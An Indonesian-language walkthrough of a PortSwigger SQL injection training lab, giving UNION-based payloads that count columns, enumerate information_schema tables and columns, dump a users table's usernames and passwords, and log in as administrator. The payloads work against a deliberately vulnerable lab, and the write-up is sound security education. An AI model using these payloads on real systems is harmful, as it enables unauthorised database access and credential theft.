# Lab: SQL injection attack, listing the database contents on non-Oracle databases

## Deskripsi
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

## Resource
https://portswigger.net/web-security/sql-injection/examining-the-database

## Langkah - langkah
1. Masuk ke halaman lab terlebih dahulu menggunakan browser bawaan Burp Suite.
<img width="1919" height="1137" alt="image" src="https://github.com/user-attachments/assets/a8b4ebae-17b6-45dc-9f8e-02977885e7d8" />

2. Setelah itu, aktifkan intercept di Burp Suite, kemudian klik salah satu kategori barang.
<img width="1919" height="1140" alt="image" src="https://github.com/user-attachments/assets/91bf0247-4792-406d-8b57-879ed0412aa3" />

3. Sebelum melakukan SQL injection untuk melihat nama dari tabel user dengan memodifikasi parameter "category" di request, cek jumlah kolom dari query untuk membuat payload menggunakan UNION.
   * 1 kolom: `'+UNION+SELECT+'a'--`
      <img width="1919" height="1135" alt="image" src="https://github.com/user-attachments/assets/9149d89c-50ef-48c3-bcdf-89f2cd0d39f6" />
     Hasil:
      <img width="1919" height="1135" alt="image" src="https://github.com/user-attachments/assets/7515cba9-2d60-4aa1-b945-868f93cb1ad9" />
     Adanya internal server error menandakan bahwa jumlah kolom query bukan 1.
   * 2 kolom: `'+UNION+SELECT+'a','a'--`
      <img width="1919" height="1140" alt="image" src="https://github.com/user-attachments/assets/c2b01fee-4d2d-4ff6-8929-fe505ee495e4" />
     Hasil:
      <img width="1919" height="1138" alt="image" src="https://github.com/user-attachments/assets/90fdae08-550e-4854-b155-583718ba17e2" />
     Adanya hasil secara langsung menandakan bahwa jumlah kolom query adalah 2.

4. Lihat daftar tabel dengan menggunakan payload `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`.
<img width="1919" height="1139" alt="image" src="https://github.com/user-attachments/assets/e1f0442e-ec8d-4688-9f39-3e7730caecdb" />
Hasil:
<img width="1919" height="1137" alt="image" src="https://github.com/user-attachments/assets/2898abf6-339b-4216-bcc9-4188776b1c97" />

5. Cari table users.
<img width="1919" height="1135" alt="image" src="https://github.com/user-attachments/assets/65b176a3-19ae-4731-b731-632622f8d9a9" />
Tabel user yang digunakan di sini adalah `users_uostcm`

6. Cari seluruh nama kolom yang ada di tabel user dengan menggunakan payload `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_uostcm'--`
<img width="1919" height="1133" alt="image" src="https://github.com/user-attachments/assets/24746679-d34c-47fa-901b-fb931b72860f" />
Hasil:
<img width="1919" height="1131" alt="image" src="https://github.com/user-attachments/assets/8a9b9ec1-86ed-4f5c-9b42-725f2760a543" />
Nama kolom username dan password adalah `username_qtgmxa` dan `password_weqdqm`.

7. Lihat seluruh username dan password pada tabel user dengan menggunakan payload `'+UNION+SELECT+username_qtgmxa,+password_weqdqm+FROM+users_uostcm--`
<img width="1919" height="1081" alt="image" src="https://github.com/user-attachments/assets/8f69749d-51fe-4e4d-83e6-2e3dbb137f2c" />
Password dari user `administrator` adalah `568uz0at9q5u9x5l0dxg`.

8. Login sebagai user `administrator` dengan credential yang didapatkan.
<img width="1919" height="1137" alt="image" src="https://github.com/user-attachments/assets/6478579e-3a09-4b1f-aa5c-649d8e9582b6" />


## Catatan
Di soal ini, karena query SQL belum diketahui, maka harus dicari terlebih dahulu jumlah kolomnya.

Dengan adanya tabel `information_schema` yang menunjukkan informasi terkait seluruh tabel di database, ada banyak petunjuk yang dapat digunakan untuk mendapatkan credential tertentu (dalam kasus ini, user `administrator`).
